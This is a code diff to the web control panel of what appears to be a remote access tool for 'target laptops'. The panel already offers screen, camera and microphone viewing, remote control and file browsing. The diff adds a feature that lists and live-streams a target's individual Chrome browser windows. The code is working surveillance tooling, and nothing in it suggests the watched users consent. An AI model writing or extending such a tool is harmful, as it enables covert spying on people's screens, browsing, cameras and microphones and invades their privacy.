@@ -21,11 +21,18 @@
         <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
         <button id="viewScreenMicBtn" style="background: #e83e8c;">🖥️+🎙️ Screen & Mic</button>
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
+        <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
     </div>
     
+    <div id="chrome-list-container" class="hidden" style="margin-top: 15px; background: #333; padding: 15px; border-radius: 8px; border: 2px solid #ff7300; width: 90%; max-width: 1000px; margin: 20px auto;">
+        <h3 style="color: white; margin-top: 0;">Select a Browser Window to View</h3>
+        <p style="color: #bbb; font-size: 13px;">Make sure the target browser is open and not minimized.</p>
+        <div id="chromeWindows" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;"></div>
+    </div>
+
     <div id="remote-tools" class="hidden" style="margin-top: 10px; background: #444; padding: 10px; border-radius: 8px; width: 90%; max-width: 1000px; margin: 20px auto;">
         <p style="margin: 0 0 10px 0; color: #ffc107; font-weight:bold;">⚠️ Remote Control Active: Click on the screen to control the target PC!</p>
         <input type="text" id="remoteText" placeholder="Type text to send..." style="padding: 8px; border-radius: 3px; border: none; width: 60%;">
@@ -141,7 +148,8 @@
         }
 
         function stopCurrentActive() {
-            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic') {
+            document.getElementById('chrome-list-container').classList.add('hidden');
+            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic' || activeType === 'chrome') {
                 socket.emit('stop-screen', activeTarget);
                 document.getElementById('remote-tools').classList.add('hidden');
                 if (peerConnection) peerConnection.close();
@@ -207,6 +215,46 @@
             document.getElementById('title').innerText = "Viewing Camera: " + activeTarget;
             socket.emit('request-camera', activeTarget);
         };
+
+        document.getElementById('viewChromeBtn').onclick = () => {
+            if (activeType === 'chrome-list') return;
+            stopCurrentActive();
+            activeType = 'chrome-list';
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('chrome-list-container').classList.remove('hidden');
+            document.getElementById('chromeWindows').innerHTML = "<p>Loading active browser windows...</p>";
+            document.getElementById('title').innerText = "Select Browser: " + activeTarget;
+            socket.emit('request-chrome-list', activeTarget);
+        };
+
+        socket.on('chrome-list', (data) => {
+            if (activeType !== 'chrome-list' || activeTarget !== data.targetId) return;
+            const container = document.getElementById('chromeWindows');
+            container.innerHTML = '';
+            
+            if (data.sources.length === 0) {
+                container.innerHTML = "<p style='color: #ffcc00;'>No browser windows found. Ensure they are open and not minimized.</p>";
+                return;
+            }
+
+            data.sources.forEach(source => {
+                const btn = document.createElement('button');
+                btn.style.background = '#ff7300';
+                btn.style.margin = '5px';
+                // Show first 40 chars of window title
+                const title = source.name.length > 40 ? source.name.substring(0, 40) + '...' : source.name;
+                btn.innerText = "🌐 " + title;
+                btn.onclick = () => {
+                    stopCurrentActive();
+                    activeType = 'chrome';
+                    document.getElementById('preview-video').classList.remove('hidden');
+                    document.getElementById('preview-video').muted = false;
+                    document.getElementById('title').innerText = "Viewing Window: " + source.name;
+                    socket.emit('request-chrome-window', { targetId: activeTarget, sourceId: source.id });
+                };
+                container.appendChild(btn);
+            });
+        });
 
         document.getElementById('listenMicBtn').onclick = () => {
             if (activeType === 'mic') return;
@@ -407,6 +455,7 @@
             document.getElementById('clientsList').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
             document.getElementById('file-browser').classList.add('hidden');
+            document.getElementById('chrome-list-container').classList.add('hidden');
             document.getElementById('controls').classList.add('hidden');
             document.getElementById('backBtn').classList.add('hidden');
             document.getElementById('title').innerText = "Connected Target Laptops";
